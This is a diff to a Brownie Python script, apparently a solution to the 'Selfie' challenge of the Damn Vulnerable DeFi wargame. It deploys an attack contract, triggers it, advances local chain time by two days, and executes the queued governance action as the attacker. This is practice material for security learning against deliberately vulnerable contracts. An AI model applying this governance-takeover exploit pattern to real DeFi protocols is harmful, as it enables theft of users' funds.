@@ -1,4 +1,9 @@
-from brownie import DamnValuableTokenSnapshot, SelfiePool, SimpleGovernance
+from brownie import (
+    DamnValuableTokenSnapshot,
+    SelfiePool,
+    SimpleGovernance,
+    AttackSelfie,
+)
 from web3 import Web3
 from brownie import web3
 from brownie.network.state import Chain
@@ -30,6 +35,12 @@ def deploy():
 def attack():
     # 攻击代码写到这里
     print("running func attack..")
+    attack_contract = AttackSelfie.deploy(token, governance, pool, {"from": attacker})
+    attack_contract.attack({"from": attacker})
+    # 在区块链上的timestap 增加2天
+    sec_2_days = 2 * 24 * 60 * 60
+    web3.provider.make_request("evm_increaseTime", [sec_2_days])
+    governance.executeAction(attack_contract.actionId(), {"from": attacker})
     return
 
 
